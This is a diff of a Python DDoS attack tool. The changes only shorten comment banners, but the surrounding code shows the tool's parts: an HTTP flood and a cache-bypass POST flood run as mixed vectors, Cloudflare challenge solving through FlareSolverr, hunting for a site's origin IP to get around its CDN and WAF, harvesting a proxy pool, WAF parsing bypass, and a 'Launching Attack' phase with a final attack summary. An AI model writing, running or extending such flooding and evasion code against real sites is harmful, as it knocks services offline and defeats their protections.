@@ -228,9 +228,9 @@ def menu():
     
     _RICH_CONSOLE.print(menu_text)
 
-# =====================================================================
+# =
 # TOGGLE BYPASS FEATURES
-# =====================================================================
+# =
 def toggle_bypass_features():
     """Interactive toggling of bypass feature flags."""
     global BYPASS_FLAGS
@@ -1498,7 +1498,7 @@ async def run_mixed_attack(target: str, cfg: dict):
                 return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
         tasks.append(wrapper())
 
-    # ============== ALL VECTORS ==============
+    # ALL VECTORS
     add_go_vector("HTTP Flood", "http-flood",
                   int(rps * 0.5), threads=max_threads)
     add_go_vector("Cache-Bypass POST", "cache-bypass",
@@ -1684,7 +1684,7 @@ async def run_auto_mode(target: str, cfg: dict):
     if inactive:
         _RICH_CONSOLE.print(f"[bold yellow][!][/] Disabled bypass: [dim]{', '.join(inactive)}[/]")
     
-    # ============== PHASE 0: FLARESOLVERR AUTO-DETECT ==============
+    # PHASE 0: FLARESOLVERR AUTO-DETECT
     flaresolverr_ok = False
     if bypass.get("flaresolverr", True) and cfg.get("flaresolverr", {}).get("enabled", True):
         _RICH_CONSOLE.print()
@@ -1713,7 +1713,7 @@ async def run_auto_mode(target: str, cfg: dict):
         except Exception as e:
             _RICH_CONSOLE.print(f"[bold yellow][!][/] proxy setup failed: {e}")
     
-    # ============== PHASE 0.5: CF CHALLENGE SOLVE ==============
+    # PHASE 0.5: CF CHALLENGE SOLVE
     cf_cookies = None
     if not flaresolverr_ok:
         _RICH_CONSOLE.print()
@@ -1818,7 +1818,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
 
     _rich_header("AUTO MODE - ADAPTIVE MULTI-VECTOR")
 
-    # ============== PHASE 0: BANDWIDTH DETECTION ==============
+    # PHASE 0: BANDWIDTH DETECTION
     print(f" {c('c','[*]')} Phase 0: Connection Analysis")
     _rich_sep()
     try:
@@ -1835,7 +1835,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
         print(f" {c('y','[!]')} Bandwidth detect failed: {e}")
         safe_caps = {"tier": "MEDIUM", "max_rps": max_rps, "max_threads_per_vec": 100}
 
-    # ============== PHASE 1: RECON ==============
+    # PHASE 1: RECON
     print(f"\n {c('c','[*]')} Phase 1: Target Reconnaissance")
     _rich_sep()
 
@@ -1844,7 +1844,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
         print(f" {c('r','[-]')} Target unreachable")
         return
     
-    # ============== PHASE 1.5: TARGET FINGERPRINTING (WordPress Detection) ==============
+    # PHASE 1.5: TARGET FINGERPRINTING (WordPress Detection)
     print(f"\n {c('c','[*]')} Phase 1.5: Target Architecture Fingerprinting")
     _rich_sep()
     
@@ -1869,7 +1869,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
         print(f" {c('y','[!]')} Fingerprinting failed: {e}")
         target_arch = {"target_type": "generic", "endpoints": []}
 
-    # ============== PHASE 2: ORIGIN HUNT ==============
+    # PHASE 2: ORIGIN HUNT
     origin_ip = ""
     bypass_cdn = False
     if profile.cdn != "none" or profile.waf != "none":
@@ -1901,7 +1901,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
         except Exception as e:
             print(f" {c('y','[!]')} Origin hunt error: {e}")
 
-    # ============== PHASE 3: PROXY HARVEST & VALIDATION ==============
+    # PHASE 3: PROXY HARVEST & VALIDATION
     proxy_pool = None
     proxy_file_for_go = ""
     print(f"\n {c('c','[*]')} Phase 3: Proxy Pool Setup & Validation")
@@ -1962,7 +1962,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
         import traceback
         traceback.print_exc()
 
-    # ============== PHASE 4: ADAPTIVE VECTOR SELECTION ==============
+    # PHASE 4: ADAPTIVE VECTOR SELECTION
     print(f"\n {c('c','[*]')} Phase 4: Adaptive Attack Vector Selection")
     _rich_sep()
     
@@ -2153,7 +2153,7 @@ async def run_auto_mode_legacy(target: str, cfg: dict):
     print(f" {c('c','[*]')} Proxy pool: {proxy_pool.stats().get('total', 0) if proxy_pool else 0}")
     print()
     
-    # ============== PHASE 5: PARALLEL EXECUTION ==============
+    # PHASE 5: PARALLEL EXECUTION
     print(f" {c('c','[*]')} Phase 5: Launching Attack")
     _rich_sep()
     
@@ -2437,7 +2437,7 @@ async def run_advanced_2026(target: str, cfg: dict):
     env = load_env()
     bypass = load_bypass_flags(env)
     
-    # === FEATURES PANEL ===
+    # FEATURES PANEL
     features = {
         "H2 Impersonation": bypass.get("http2_impersonation", True),
         "WAF Parsing Bypass": bypass.get("waf_parsing_bypass", True),
@@ -2480,7 +2480,7 @@ async def run_advanced_2026(target: str, cfg: dict):
     try:
         from core.bypass.orchestrator import execute_advanced_attack
         
-        # === LIVE PROGRESS DISPLAY ===
+        # LIVE PROGRESS DISPLAY
         from rich.live import Live
         from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
         
@@ -2603,7 +2603,7 @@ async def run_advanced_2026(target: str, cfg: dict):
             # Small delay to show final state
             await asyncio.sleep(1.5)
         
-        # === FINAL RICH SUMMARY ===
+        # FINAL RICH SUMMARY
         summary_table = Table(title="[bold green]ADVANCED 2026 - ATTACK COMPLETE[/]",
                               box=box.HEAVY_EDGE, border_style="green")
         summary_table.add_column("Metric", style="bold white")
